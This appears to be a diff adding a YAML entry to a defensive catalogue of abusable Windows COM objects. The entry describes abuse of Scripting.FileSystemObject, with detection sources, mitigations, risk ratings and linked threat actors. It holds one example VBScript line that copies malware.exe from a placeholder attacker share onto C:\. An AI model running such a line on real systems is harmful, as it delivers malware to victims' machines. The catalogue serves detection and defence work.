@@ -1,0 +1,52 @@
+name: Scripting.FileSystemObject COM Object
+category: windows-com-api
+subcategory: file-operations
+api:
+  namespace: Scripting.FileSystemObject
+  language: VBScript/JavaScript
+  documentation: https://learn.microsoft.com/en-us/windows/win32/wmi_snmp/scripting-filesystemobject
+  object: Scripting.FileSystemObject
+abuse_scenarios:
+- name: Malware distribution via script
+  technique_id: T1566.001
+  description: Download and write malware files to disk
+  code_snippet: 'Set fso = CreateObject("Scripting.FileSystemObject")
+
+    fso.CopyFile "\\\\attacker\\\\malware.exe", "C:\\malware.exe", True'
+  detection_difficulty: easy
+  common_in_campaigns: true
+detection:
+- vendor: Sysmon
+  effectiveness: high
+  notes: Monitor file creation from script engines
+- vendor: File Integrity Monitoring
+  effectiveness: high
+  notes: Detect unauthorized file creation/modification
+mitigation:
+- category: policy
+  description: Disable Windows Script Host and VBScript
+  feasibility: high
+risk:
+  severity: high
+  prevalence: widespread
+  ease_of_abuse: easy
+  likelihood_in_real_attacks: 80
+references:
+  techniques:
+  - T1566.001
+  threat_actors:
+  - APT1
+  - Lazarus
+  malware_families:
+  - Emotet
+  - IcedID
+  tools:
+  - Custom scripts
+tags:
+- windows-com-api
+- file-operations
+- script
+id: 93bb263d-30ea-43a7-b9bd-a3ca9744bd9a
+author: magicsword-io
+created: '2026-02-02'
+verified: true
